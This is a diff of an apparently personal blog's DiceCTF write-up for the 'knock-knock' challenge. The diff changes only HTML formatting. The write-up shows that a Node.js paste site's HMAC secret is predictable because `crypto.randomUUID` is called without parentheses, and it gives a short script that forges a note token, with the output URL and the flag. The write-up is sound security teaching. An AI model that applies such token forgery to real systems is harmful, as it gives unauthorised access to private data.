@@ -4,7 +4,7 @@
     <title>[DICECTF] knock-knock // Tzion</title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.92.0" />
+    <meta name="generator" content="Hugo 0.68.3" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="Tzion" />
     <meta name="description" content="" />
@@ -26,10 +26,9 @@ After clicking the create button, it will redirect us to a page with an unique t
 https://knock-knock.mc.ax/note?id=2249&amp;token=262fedf8ca783b2fd19c581064ab48511877fe2bff4f3ad79726c9ae8277cfd5 Fortunately we have source code comes with this challenge:
 const crypto = require(&#39;crypto&#39;); class Database { constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } createNote({ data }) { const id = this." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://tzion0.github.io/posts/dicectf-knock-knock/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://tzion0.github.io/posts/dicectf-knock-knock/" />
 <meta property="article:published_time" content="2022-02-07T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-02-07T00:00:00+00:00" />
-
 
 
   </head>
@@ -101,9 +100,9 @@ const crypto = require(&#39;crypto&#39;); class Database { constructor() { this.
 <p>Looking at the webpage, it is a site similar to pastebin that let us to create paste.</p>
 <p><img src="/img/dicectf-knock-knock/img.png" alt="IMG"></p>
 <p>After clicking the <code>create</code> button, it will redirect us to a page with an unique token that contains our paste:</p>
-<pre tabindex="0"><code>https://knock-knock.mc.ax/note?id=2249&amp;token=262fedf8ca783b2fd19c581064ab48511877fe2bff4f3ad79726c9ae8277cfd5
+<pre><code>https://knock-knock.mc.ax/note?id=2249&amp;token=262fedf8ca783b2fd19c581064ab48511877fe2bff4f3ad79726c9ae8277cfd5
 </code></pre><p>Fortunately we have source code comes with this challenge:</p>
-<pre tabindex="0"><code>const crypto = require('crypto');
+<pre><code>const crypto = require('crypto');
 
 class Database {
   constructor() {
@@ -168,12 +167,12 @@ app.listen(3000, () =&gt; {
 
 </code></pre><p>Looking at the source code, we can determine that the value of param <code>id</code> will increase by 1 everytime someone create a paste, while the token is created by using <code>crypto.createHmac()</code> with a secret key.</p>
 <p>It tooks me a while to actually notice where the vulnerability is. In fact, the vulnerability is hiding in this code:</p>
-<pre tabindex="0"><code>constructor() {
+<pre><code>constructor() {
     this.notes = [];
     this.secret = `secret-${crypto.randomUUID}`;
 }
 </code></pre><p>The calling of <code>crypto.randomUUID</code> missing parentheses, it actually will always return the following on recommended version of nodejs:</p>
-<pre tabindex="0"><code>secret-function randomUUID(options) {
+<pre><code>secret-function randomUUID(options) {
   if (options !== undefined)
     validateObject(options, 'options');
   const {
@@ -186,14 +185,14 @@ app.listen(3000, () =&gt; {
 }
 </code></pre><h4 id="note-for-lower-version-of-nodejs-it-will-return-undefined-instead">Note: For lower version of nodejs, it will return <code>undefined</code> instead.</h4>
 <p>So the correct code should be <code>crypto.randomUUID()</code> to get the proper random secret. With that, I create a small script to generate URL of other paste, I assuming that the first paste <code>id=0</code> is the flag:</p>
-<pre tabindex="0"><code>const crypt = require('crypto');
+<pre><code>const crypt = require('crypto');
 secret = `secret-${crypt.randomUUID}`;
 
 console.log(`https://knock-knock.mc.ax/note?id=0&amp;token=${crypt.createHmac('sha256', secret).update('0').digest('hex')}`);
 </code></pre><p>Output:</p>
-<pre tabindex="0"><code>https://knock-knock.mc.ax/note?id=0&amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
+<pre><code>https://knock-knock.mc.ax/note?id=0&amp;token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
 </code></pre><p>Flag:</p>
-<pre tabindex="0"><code>dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}
+<pre><code>dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}
 </code></pre>
     </div>
     <div class="post-footer">
